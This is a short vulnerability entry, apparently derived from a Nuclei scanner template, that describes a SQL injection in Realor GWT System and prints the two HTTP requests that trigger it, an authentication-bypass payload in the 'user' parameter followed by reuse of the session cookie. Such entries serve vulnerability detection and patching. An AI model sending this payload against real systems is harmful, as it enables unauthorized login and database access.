# Vulnerability: Realor GWT System SQL injection
**Classification:** CWE-89
**Source:** Nuclei Template (`realor-gwt-system-sqli.yaml`)

## Description
Realor GWT System system improperly handles the security of data passed by users, resulting in a SQL injection vulnerability. Remote and unauthorized attackers can use this vulnerability to obtain sensitive information in the database, and can further write webshell backdoors. Access, the attacker can execute arbitrary malicious code on the target server and gain system privileges.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /AgentBoard.XGI?user='||'1&cmd=UserLogin HTTP/1.1
Host: {{Hostname}}

GET /Board.XGI HTTP/1.1
Cookie: PHPSESSID={{cookie}}
Host: {{Hostname}}
```

